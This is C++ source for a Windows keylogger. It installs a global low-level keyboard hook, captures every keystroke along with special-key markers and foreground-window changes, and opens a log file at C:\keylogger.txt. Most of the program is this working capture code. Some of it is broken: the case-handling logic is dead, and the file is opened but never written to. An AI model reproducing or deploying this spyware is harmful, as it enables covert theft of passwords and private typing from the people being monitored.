#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <Windows.h>
#include <map>
#include <SDKDDKVer.h>


HHOOK KeyboardHook;
HWND previousWindow = NULL;
char windowTitle[300];
std::string fileName = "C:\\keylogger.txt";

bool isCapsActive;
bool isShiftActive;

typedef std::map<DWORD, int> MapType;			
char charBuffer[1];
uint8_t keyboardState[256] = { 0 };
static HKL keyboardLayout = 0;





void printArt() {
	std::cout << "________________________________________________________________________________								";
	std::cout << "|  ____                                                                        |				 				";
	std::cout << "| [____] [_]   [_][_][_][_] [_][_][_][_] [_][_][_][_] [_][_][_]   [_][_][_][_] |		\\		/				";
	std::cout << "|                                                ___                           |		 \\	   /				";
	std::cout << "| [_][_] [§][1][2][3][4][5][6][7][8][9][0][+]['][___] [_][_][_]   [_][_][_][_] |		  \\  /					";
	std::cout << "| [_][_] [__][q][å][ä][p][y][f][g][c][r][l][x][@][  | [_][_][_]   [_][_][_][_| | ________\\/_______           ";
	std::cout << "| [_][_] [___][a][o][e][u][i][d][h][t][n][s][j][-][_|             [_][_][_][_| |		   /\\		         	";
	std::cout << "| [_][_] [_][<]['][,][.][k][ö][b][m][w][v][z][______]    [_]      [_][_][_][_| |		  /  \\					";
	std::cout << "| [_][_] [__][_][__][_____________________][__][_][_]  [_][_][_]  [____][_][_| |		 /	  \\				";
	std::cout << "|______________________________________________________________________________|		/      \\				";
}

std::string GetHookCode(DWORD vkCode, bool isCapsActive, bool isShiftActive){
	//if the XOR of both == True, then that means that it's lowercase
	if (!isCapsActive != !isShiftActive) {
		bool isUpper = true;
	}
	bool isUpper = false;

	GetKeyboardState(keyboardState);
	ToAsciiEx(vkCode, MapVirtualKeyExA(vkCode, 0, 0), (const BYTE *)keyboardState, (LPWORD )charBuffer, 0, keyboardLayout);
	return charBuffer;
}


//LOCALE_SNAME;
LRESULT CALLBACK hookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
	//std::cout << "This is the hook procedure";

	//open the file
	std::ofstream myfile;
	myfile.open(fileName, std::ios::out | std::ios::app);

	//checking whether it is uppercase of lowercase by looking at the keystate of the capslock button
	SHORT keyState = GetKeyState(VK_CAPITAL);

	std::string output;
	std::stringstream temp;

	if (keyState > 0) {
		isCapsActive = true;
	}
	else {
		isCapsActive = false;
	}

	//This is a struct bellow that contains info about the lowLevelKeyboard event
	tagKBDLLHOOKSTRUCT *p = (tagKBDLLHOOKSTRUCT *)lParam;
	
	//NOTE: There ineeds to be a better way of doing this
	//TODO have a table of certain vkCode exlusions to skip running the hook procedrue on.
	//if nCode == 0, then wParam and lParam contain information about the keyboard message
	if (nCode == HC_ACTION) {
		//if our message is regarding the key shift:
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
			//we need to check whether the shift has been released or pressed
			if (wParam == WM_KEYDOWN) {
				isShiftActive = true;
			}
			else {
				isShiftActive = false;
			}
		}

		else if (p->vkCode == VK_CAPITAL) {

			if (wParam == WM_KEYDOWN) {
				isCapsActive = true;
			}
			else {
				isCapsActive = false;
			}
		}

		//Now that we know whether we are uppercase or lower case
		//if this was a keydown event:
		else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			//A handle to the current WIndow the user is currently interfacing with
			HWND currentWindow;

			//TODO move some of these statements to a seperate exlusion function for processing keys
			if (p->vkCode == VK_BACK) {
				temp << "'-BS-'";
				output.append(temp.str());
				std::cout << temp.str();
				goto returnVal;	//TODO remove goto
			}
			else if (p->vkCode == VK_DELETE) {
				temp << "'-DEL-'";
				output.append(temp.str());
				std::cout << temp.str();
				goto returnVal;	//TODO remove goto
			}
			else if (p->vkCode == VK_RETURN) {
				temp << "'-ENT-' ";
				output.append(temp.str());
				std::cout << temp.str();
				std::cout << std::endl;
				goto returnVal;	//TODO remove goto, this code is messy and unstructered af
			}

			if ((currentWindow = GetForegroundWindow()) != previousWindow) {
				int windowTitleValue = GetWindowTextA(currentWindow, windowTitle, sizeof windowTitle);
				temp << "WindowTitle: " << currentWindow << std::endl;
				output.append(temp.str());
				std::cout << temp.str() << std::endl;
				//TODO finish this off !!!  
				previousWindow = currentWindow;
			}
			if (p->vkCode) {
				if (wParam == WM_KEYDOWN) {
					temp << GetHookCode(p->vkCode, isCapsActive, isShiftActive);
					temp.clear();   
					output.append(temp.str());
					std::cout << temp.str();			
				}
			}
		}
	}

	returnVal:
	temp.clear();
	// hook procedure must pass the message *Always*
	//myfile.close();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main() {
	//This is our keylogger program
	std::cout << "\nWindows Keylogger...\n\n";
	//printArt();
	KeyboardHook = SetWindowsHookExA(
		WH_KEYBOARD_LL,
		hookProcedure,
		GetModuleHandle(NULL),
		NULL
	);

	if (!KeyboardHook) {
		std::cout << "Failed to get a handle from SetWindowsHookExA()" << std::endl;
	}
	else {
		std::cout << "Keycapture handle ready...\n\n";
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}
	//Exit on failure
	UnhookWindowsHookEx(KeyboardHook);
	exit(0);

	return 0;
	}
	
